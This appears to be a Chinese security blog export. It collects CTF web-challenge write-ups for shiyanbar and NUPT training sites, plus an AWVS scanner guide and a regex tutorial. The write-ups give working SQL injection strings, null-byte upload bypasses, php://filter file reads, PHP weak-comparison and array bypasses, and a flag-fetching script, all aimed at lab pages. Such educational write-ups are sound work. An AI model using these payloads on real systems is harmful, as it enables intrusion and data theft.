这段代码的意思就是说，我们传进去的id经过url解密之后与hackerDJ是一样的，不说废话，行动起来，hackerDJ经url加密之后是%68%61%63%6b%65%72%44%4a,传进去之后依然不行，这是因为浏览器会自动对url进行解码，嗯，所以我们要进行二次加密，再次加密之后变为%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61。 0x09 SQL注入题目：http://ctf5.shiyanbar.com/web/index_2.php解题方法：既然是SQL注入，那么我们就要构造注入语句了，这个就要有耐心一个一个去尝试了输入语句 1&#39;and 1=1 # 和 1&#39;and/**/1=1/**/#后 对比一下，发现是过滤掉了空格，我们用/**/代替空格下面就要构造找flag的语句了 1&#39;/**/union/**/select/**/flag/**/from/**/flag# 最后就能找到flag了，（其实这里面还有一些步骤，用SQLMap跑啊跑~） 0x0A 简单脚本使用题目：http://ctf5.shiyanbar.com/web/10/10.php解题方法：查看源代码这句话的意思就是，让我们传一个参数key.根据前面的提示，看响应头这个FLAG明显是经过base64加密的，解码之后P0ST_THIS_T0_CH4NGE_FL4G:Lx17DdQma用脚本跑一下， import re import requests import base64 import io import sys r = requests.Session() #因为reqests请求的和post提交的数据要保持一致 sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;) #改变默认输出的编码 html = r.head(&#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;) result = html.headers results = result[&#39;FLAG&#39;] print(results) de_results = str(base64.b64decode(results.encode(&#39;utf-8&#39;))) print(de_results) data = de_results.split(&#39;:&#39;,1)[1] datas = data.replace(&#39;\&#39;&#39;, &#39;&#39;) print(datas) flag = {&#39;key&#39;:datas} flags = r.post(&#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;, data=flag) print(flags.text) 0x0B 后台登录题目：http://ctf5.shiyanbar.com/web/pcat/index.php解题方法：查看源代码这点的意思是：原来的程序员在写网页时给自己的一个提醒是源码在这个地方，我们要查看时将source.txt复制到当前地址栏里替换index.php，然后回车就能看到源码了: &lt;?php error_reporting(0); if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) { echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;; echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;; echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;; echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;; echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;; echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){ print &quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;; exit(); } } $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; foreach($_POST as $key=&gt;$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;); if (!$con){ die(&#39;Could not connect: &#39; . mysql_error()); } $db=&quot;XXXXXX&quot;; mysql_select_db($db, $con); $sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) { print &quot;CTF{XXXXXX}&quot;; }else{ print &quot;浜﹀彲璧涜墖锛�&quot;; } }else{ print &quot;涓€棰楄禌鑹囷紒&quot;; } mysql_close($con); ?&gt; 在这代码中有意思的地方是： $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; foreach($_POST as $key=&gt;$value){ AttackFilter($key,$value,$filter); } 他将这些sql注入的语句禁止了 $sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) { print &quot;CTF{XXXXXX}&quot;; }else{ print &quot;浜﹀彲璧涜墖锛�&quot;; } }else{ print &quot;涓€棰楄禌鑹囷紒&quot;; 这一部分的语句是说将输入进来的用户名与库里的进行对比，如果正确就输出flag，否则就会报错那么接下来我们应该怎么做呢？我们进行SQL注入： &#39; or 1=1 group by pwd with rollup limit 1 offset 2 # 在这句语句中 &#39; or 1=1 我们都知道这是注入的一个常用语句，异或为真，恒成立 group by pwd with rollup 这句是sql里的添加一行，使得密码为空 limit 1 是查询的意思，查询第一行 offset 2 是从第二条数据开始查询 将这条语句输入到第一个框内，提交查询就可以的出flag，如果输入其他就会报错 0x0C 代码逆向题目：解题方法：0x0D 上传绕过题目：http://ctf5.shiyanbar.com/web/upload/解题方法：随便上传一个1.jpg文件上传一个1.php文件显然我们上传的文件被截断了，这就让我们想到了%00截断。%00一般被认为是结束的标志，其后的东西都被认为是不存在的。抓包将上传的1.php文件改为1.jpg,在/uploads/后面添加1.php .jpg,并且在hex模块将空格所对应的十六进制20改为00，然后GO。得到flag 0x0E hash函数题目：http://ctf5.shiyanbar.com/web/false.php解题方法：查看源码 &lt;?php if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) { if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;]) echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;; else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])) die(&#39;Flag: &#39;.$flag); else echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;; } else{ echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;; ?&gt; 这段代码的意思就是，输入的name和password经过sha1()函数加密后相等，但二者不一样。应该利用false===false，md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 faslepayload：?name[]=1&amp;password[]=123 0x0F 备份文件题目：http://ctf5.shiyanbar.com/10/upload/step1.php解题方法：我们先输入一个邮箱试试，发现不行查看源代码我们发现了管理员邮箱，也知道了这是用vim写的文件。哎，我们刚才还发现了一个step2.php,试试。结果页面一闪而过，嗯，有猫腻，抓包。抓到一个submit.php,试试，不行。用过Linux的vim的都知道，vim会产生一个临时文件.submit.php.swp。这是一个隐藏文件。这段代码是说，我们需要传入token和emailAddress，token必须长度为10，大小为0，可令token=0000000000，或用科学计数法，正好，我们刚才发现一个管理员邮箱。 0x11 验证码题目：解题方法：0x12 cookie题目：http://ctf5.shiyanbar.com/web/Session.php解题方法：查看源代码 &lt;?php session_start(); if (isset ($_GET[&#39;password&#39;])) { if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]) die (&#39;Flag: &#39;.$flag); else print &#39;&lt;p&gt;Wrong guess.&lt;/p&gt;&#39;; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?&gt; 这段代码的关键就在于：password = $_session[&#39;password&#39;]Cookie与 Session，一般都会认为这是两个独立完全不同的东西，Session采用的是在服务器端保持状态的方案，而Cookie采用的是在客户端保持状态的方案。在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了。 用Burpsuite抓包 从抓包的内容中我们就能看见在Cookie中已经是包含了Sessid，并且发送的password在URL中以Get的方式传值。那这里我们就可以以这样的思路来求解。首先我们删除所有的Cookie，将PHPSessid值直接删掉，这样的结果就会使得$_session[&#39;password&#39;]值为空，接下来我们将URL中的password值清空，这样我们就能达到password = $_session[&#39;password&#39;]的效果。 0x13 MD5碰撞题目：http://ctf5.shiyanbar.com/web/kzhan.php解题方法：随便输入一些东西，发现什么都没有，抓包哎，我们发现有一个source=0,改成source=1试试 $flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;; $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security! $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } } 源代码出来了。想要获得flag，需要满足几个条件：1.urldecode($username) === &quot;admin&quot; 2.urldecode($password) != &quot;admin&quot; 3.$COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))其中$secret是长度为15的未知字符串，而条件1、2很好满足，条件3则需要进行哈希长度扩展攻击来满足关于什么是哈希长度扩展攻击，怎么进行的可以看下面这个链接：https://github.com/iagox86/hash_extender 在cookie中可以看到sample-hash=571580b26c65f306376d4f64e53cb5c7，这是$secret跟两个admin连接后的字符串的哈希值，md5(???????????????adminadmin)，新字符串长度为25。我们要提交的username必定为admin，也就是说，我们提交的getmein必须是$secret跟admin以及$password连接后的字符串的哈希值。 0x14 总结遇到不会的函数可以自己百度]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWVS的基本使用]]></title>
    <url>%2F2019%2F03%2F20%2Fawvs-de-ji-ben-shi-yong%2F</url>
    <content type="text"><![CDATA[前言Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5） ToolsSite Crawler 点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。 Target Finder 可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。进行了端口扫描后会进行服务发现，得到端口上对应的服务。 Subdomain Scanner 用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） Blind SQL Injector 在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。 HTTP Editor和BP repeater类似，可以进行手动漏洞挖掘探测。 Enocoder tool中可以进行各种加密解密 HTTP Sniffer和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。 手动设置代理 HTTP Fuzzer 类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。 Authentication Tester 认证测试，用于尝试破解破解账户密码。 基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。 Compare Results可以用不同用户登录后结果进行比较，和BP Compare类似。 ConfigurationApplication Settings Client Certifications：有些Web Application需要客户端证书才能进行扫描。 Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence Scan Settings Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。 站点扫描 点击New Scan 点击扫描配置就是Scan Setting页面 发现目标服务器基本信息 是否需要登录，可以使用login sequence finish，扫描结果可以保存为wvs文件，还能把结果制作成报表]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2019%2F03%2F10%2Fzheng-ze-biao-da-shi%2F</url>
    <content type="text"><![CDATA[前言&#160; &#160; &#160; 字符串是编程时涉及到的最多的一种数据结构，对字符串进行操作的需求几乎无处不在。比如判断一个字符串是否是合法的Email地址，虽然可以编程提取@前后的子串，再分别判断是否是单词和域名，但这样做不但麻烦，而且代码难以复用。&#160; &#160; &#160; 正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。 语法&#160; &#160; &#160; 构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大的表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。 &#160; &#160; &#160; 正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。 普通字符&#160; &#160; &#160; 普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。 非打印字符&#160; &#160; &#160; 非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列： 字符 描述 \cx 匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 特殊字符&#160; &#160; &#160; 许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特殊字符 描述 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 字符，请使用 \。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。 . 匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用 [。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。 \ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “\”，而 ‘(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 \^。 { 标记限定符表达式的开始。要匹配 {，请使用 {。 指明两项之间的一个选择。要匹配 ，请使用 \ 。 限定符&#160; &#160; &#160; 限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo 能匹配 “z” 以及 “zoo”。 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。{n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南京邮电大学网络攻防训练平台]]></title>
    <url>%2F2018%2F11%2F19%2Fnan-jing-you-dian-da-xue-wang-luo-gong-fang-xun-lian-ping-tai%2F</url>
    <content type="text"><![CDATA[前言刚刚接触CTF不久，还是决定先从web开始，于是就开始了自己的南邮刷题之旅，谨以此记录自己的学习过程，总结解题方法，勉励自己坚持学习！ 签到题题目链接：http://chinalover.sinaapp.com/web1/解题思路单个页面查看源代码。 解题方法 flagnctf{flag_admiaanaaaaaaaaaaa} md5 collision题目链接：http://chinalover.sinaapp.com/web19/解题思路PHP代码阅读： &lt;?php $md51 = md5(&#39;QNKCDZO&#39;); $a = @$_GET[&#39;a&#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) { echo &quot;nctf{*****************}&quot;; } else { echo &quot;false!!!&quot;; }} else{echo &quot;please input a&quot;;} ?&gt; 核心代码：$a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52主要是利用了 PHP 弱类型语言的松散比较符的缺陷。从源码中可以得输入一个 a 的参数的变量，a 首先不等于QNKCDZO并且 a 得 md5 值必须等于QNKCDZO加密后的 md5 值。 乍一看好像不可能存在这样的值，但是这里QNKCDZO加密后的 md5 值为0e830400451993494058024219903391这里是0e开头的，在进行等于比较的时候，PHP 把它当作科学计数法，0 的无论多少次方都是零。 所以这里利用上面的弱类型的比较的缺陷来进行解题。 解题方法 flagnctf{md5_collision_is_easy} 姿势补充：字符串加密后 md5 为 0exxxx 的字符串 (x 必须是 10 进制数字) 列表 字符串 MD5 QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 aabg7XSs 0e087386482136013740957780965295 aabC9RqS 0e041022518165728065344349536299 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 签到2题目链接：http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php解题思路题中提示输入口令：zhimakaimen,然而输入之后并没有什么卵用。 解题方法方法一查看页面源代码，发现输入框中允许输入的字符串最大长度为10，而zhimakaimen11个字符，于是果断F12修改maxlength=11,再次输入，OK了。 方法二利用Burpsuite抓包修改text1=zhimakaimen，然后GO即可 flagnctf{follow_me_to_exploit} 这题不是WEB题目链接：http://chinalover.sinaapp.com/web2/index.html解题思路一个猫的图片，看来搞信安的很多人都喜欢猫呀。加上题目提示: 这不是一个 Web 题目，所以这一题重点在这张图片上。 解题方法将图片保存下来，修改格式为txt，打开查找即可。 flagnctf{photo_can_also_hid3_msg} 层层递进题目链接：http://chinalover.sinaapp.com/web3/解题思路这一题 一上来我是懵逼的，搜索关键词找了网上的 Write-up 才明白题目想表达的意思。网站源码一看主要就使用了&lt;iframe&gt;标签，iframe元素会创建包含另外一个文档的内联框架（即行内框架）。好像有点层层递进的感觉，所以这里重点是&lt;iframe&gt;标签内的内容。 解题方法直接查看网页源代码，有一个SO.html,点击，重复几次，最后出现404.html，继续，出现下图：说实话，不仔细看是看不出来的。(内心是崩溃的） flagnctf{this_is_a_fl4g} AAencode题目链接：http://chinalover.sinaapp.com/web20/aaencode.txt解题思路抓包看返回包 解题方法flagnctf{javascript_aaencode} 单身二十年题目链接：http://chinalover.sinaapp.com/web8/解题思路抓包看返回包 解题方法方法一：方法二：查看页面源代码发现里面包含一个search_key.php文件，于是构造payload：/search_key.php,得到flag flagnctf{yougotit_script_now} 你从哪里来题目链接：http://chinalover.sinaapp.com/web22/解题思路http 头使用referer伪造 解题方法BP 抓包手动添加Google域名的referer题目有问题挂了,解题思路就是这样。 flag但网上还是能找到flag的：nctf{http_referer} php decode题目链接：解题思路PHP代码阅读： &lt;?php function CLsI($ZzvSWE) { // 定义一个 CLsI 函数，接受 ZzvSWE 的变量 $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); //ZzvSWE变量被base64解密后使用gzinflate加密 for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) { $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); //遍历ZzvSWE变量 转换为变量的每一位的ASCII值-1的字符 } return $ZzvSWE; }eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;)); ?&gt; //这里的eval函数问题很大 解题方法代码整体意思不难理解，遍历字符串中的每一个字母，然后使用Base64+Gzinflate加密，最后转换为 ASCII 码的值 - 1，再转换为字符串。所以尝试运行一下代码，发现报错，这里报错是因eval函数的问题。eval 函数: eval() 函数把字符串按照 PHP 代码来执行 该字符串必须是合法的 PHP 代码，且必须以分号结尾 如果没有在代码字符串中调用 return 语句，则返回 NULL 如果代码中存在解析错误，则 eval() 函数返回 falseeval函数一般我们在一句话木马中经常见到，结合这个就很容易理解了。解决代码运行报错就是直接将eval修改为echo直接将结果输出来: flagnctf{gzip_base64_hhhhhh} 文件包含题目链接：http://4.chinalover.sinaapp.com/web7/index.php解题思路给了乌云知识库的参考链接，阅读了一下本文主要是利用 php 流 filter 来进行文件读取。 关于 PHP 文件流后期单独来总结. 解题方法使用PHP的filter协议读取index.php，即访问 http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php ，将得到的字符串base64解码。 flagnctf{edulcni_elif_lacol_si_siht} 单身一百年也没用题目链接：http://chinalover.sinaapp.com/web9/解题思路抓包看返回包 解题方法BP抓包，flag藏在响应头里 flagnctf{this_is_302_redirect} COOKIE题目链接：http://chinalover.sinaapp.com/web10/index.php解题思路BP抓包看返回包 解题方法得到flag flagnctf{cookie_is_different_from_session} MYSQL题目链接：http://chinalover.sinaapp.com/web11/解题思路根据提示找到 robots.txt 文件下载下来然后阅读 PHP 代码: &lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。intval() 是整型转换函数，会强制转换为整形。 解题方法代码中提示了不可以直接输入id=1024, 这里得想办法来绕过才可以。可以令id=1024.xxx等之类的小数，也可以用科学计数法。 flagnctf{query_in_mysql} sql injection 3题目链接：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1解题思路解题方法flagnctf{gbk_3sqli} /x00题目链接：http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php解题思路阅读源代码： if (isset ($_GET[&#39;nctf&#39;])) { if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE) echo &#39;必须输入数字才行&#39;; else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag); else echo &#39;骚年，继续努力吧啊~&#39;; } nctf 的值是数字且必须含有#biubiubiu,根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交nctf=1%00%23biubiubiu即可。 解题方法 注意：#biubiubiu中的#URL编码为%23 flagnctf{use_00_to_jieduan} bypass again题目链接：http://chinalover.sinaapp.com/web17/index.php解题思路代码阅读； if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) { //get方式接受a和b变量 if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;]) //a 不等于 b if (md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;])) //a的md5值等于b的md5值 die(&#39;Flag: &#39;.$flag); else print &#39;Wrong.&#39;; } 这一题考察了 PHP 弱类型语言的特性.源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即var_dump(md5(array(2))===null);值为bool(true)。 解题方法因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag. flagnctf{php_is_so_cool} 变量覆盖题目链接：http://chinalover.sinaapp.com/web18/index.php解题思路source.php核心代码如下: &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { extract($_POST); if ($pass == $thepassword_123) echo $theflag; } ?&gt; 关于变量覆盖请看我的另一篇博文：https://l1395851238.github.io/2018/11/18/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/#more 解题方法 flagnctf{bian_liang_fu_gai!} PHP是世界上最好的语言题目链接：http://way.nuptzj.cn/php/index.php解题思路解题方法flag伪装者题目链接：http://chinalover.sinaapp.com/web4/xxx.php解题思路根据提示，猜测应该是伪造IP。 解题方法BP抓包，伪造IP。。。。。。。这题好像不能做了。。。。。。 flagnctf{happy_http_headers} Header题目链接：http://way.nuptzj.cn/web5/解题思路解题方法flag上传绕过题目链接：http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html解题思路 上传一张1.jpg文件，出现如下：Array ( [0] =&gt; .jpg [1] =&gt; jpg ) Upload: 1.jpg Type: image/jpeg Size: 0 Kb Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) { [&quot;dirname&quot;]=&gt; string(9) &quot;./uploads&quot; [&quot;basename&quot;]=&gt; string(5) &quot;1.jpg&quot; [&quot;extension&quot;]=&gt; string(3) &quot;jpg&quot; [&quot;filename&quot;]=&gt; string(1) &quot;1&quot; } 必须上传成后缀名为php的文件才行啊！ 上传一个1.php文件，出现如下：Array ( [0] =&gt; .php [1] =&gt; php ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件 解题方法flagnctf{welcome_to_hacks_world} SQL注入1题目链接：http://chinalover.sinaapp.com/index.php解题思路源代码： &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; echo &#39;&lt;/br&gt;&#39;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) { echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; } if($query[user] != &quot;admin&quot;) { echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); } } echo $query[user]; ?&gt; trim（）是去除两侧空格,pass经过MD5加密。 解题方法点进去是 Source 代码，没有看到显式的过滤或转义， trim（）是去除两侧空格所以尝试传入user为 admin’)--其中 ‘）用来分别用来闭合,--用来把后面给注释掉这样最后的查询语句为 select user from ctf where (user=&#39;admin&#39;) flagnctf{ni_ye_hui_sql?} pass check题目链接：http://chinalover.sinaapp.com/web21/解题思路源代码： &lt;?php $pass=@$_POST[&#39;pass&#39;]; $pass1=***********;//被隐藏起来的密码 if(isset($pass)) { if(@!strcmp($pass,$pass1)){ echo &quot;flag:nctf{*}&quot;; }else{ echo &quot;the pass is wrong!&quot;; } }else{ echo &quot;please input pass!&quot;; } ?&gt; 根据代码，pass和pass1经过strcmp比较之后结果为0. 解题方法strcmp(array,string)=null=0构造payload：?pass[]=1 flagnctf{strcmp_is_n0t_3afe} 起名字真难题目链接：http://chinalover.sinaapp.com/web12/index.php解题思路源代码: &lt;?php function noother_says_correct($number) { $one = ord(&#39;1&#39;); $nine = ord(&#39;9&#39;); for ($i = 0; $i &lt; strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) { return false; } } return $number == &#39;54975581388&#39;; } $flag=&#39;*******&#39;; if(noother_says_correct($_GET[&#39;key&#39;])) echo $flag; else echo &#39;access denied&#39;; ?&gt; 传进去的key要是数，但又不能包含数字。 解题方法转换进制，将key转换为十六进制即可。54975581388=0xcccccccccpayload:?key=0xccccccccc flagnctf{follow_your_dream} 密码重置题目链接：http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg%3D%3D解题思路既然是admin的密码，怎么用户回事ctfuser呢？抓包，将ctfuser改成admin，发现不行。注意到：地址栏url传了一个user参数，Y3RmdXNlcg%3D%3Durl解密之后Y3RmdXNlcg==,在经过bash64解密之后为ctfuser。所有adminbash64加密YWRtaW4=,再url加密%59%57%52%74%61%57%34%3d构造payload：?user1=YWRtaW4=。 